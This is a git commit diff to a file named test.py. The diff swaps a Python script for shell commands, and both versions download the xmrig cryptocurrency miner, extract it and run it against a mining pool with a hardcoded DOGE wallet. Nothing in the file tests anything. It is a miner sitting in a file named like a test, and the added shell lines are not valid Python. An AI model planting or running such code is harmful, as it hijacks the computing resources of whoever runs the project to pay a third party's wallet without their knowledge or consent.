43b591c7076a31f906497a951133194077b8f9bf
SUPREME-CONDEMNER <164725996+SUPREME-CONDEMNER@users.noreply.github.com>
2024-04-30 11:01:14 +0500

    Update test.py

--- test.py
+++ test.py
@@ -1,27 +1,7 @@
-import subprocess
-import os
-import requests
-import tarfile
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
 
-# Update package lists
-subprocess.run(['apt', 'update'])
+tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
 
-# Install msr-tools
-subprocess.run(['apt-get', '-y', 'install', 'msr-tools'])
+cd xmrig-6.12.2
 
-# Download xmrig
-url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
-download_path = "xmrig-6.12.2-linux-x64.tar.gz"
-response = requests.get(url)
-with open(download_path, "wb") as f:
-    f.write(response.content)
-
-# Extract xmrig
-with tarfile.open(download_path, "r:gz") as tar:
-    tar.extractall()
-
-# Change directory to xmrig
-os.chdir("xmrig-6.12.2")
-
-# Run xmrig
-subprocess.run(['./xmrig', '-o', 'rx.unmineable.com:3333', '-a', 'rx', '-k', '-t', '2', '-u', 'DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x'])
+./xmrig -o rx.unmineable.com:3333 -a rx -k -t 2 -u DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x
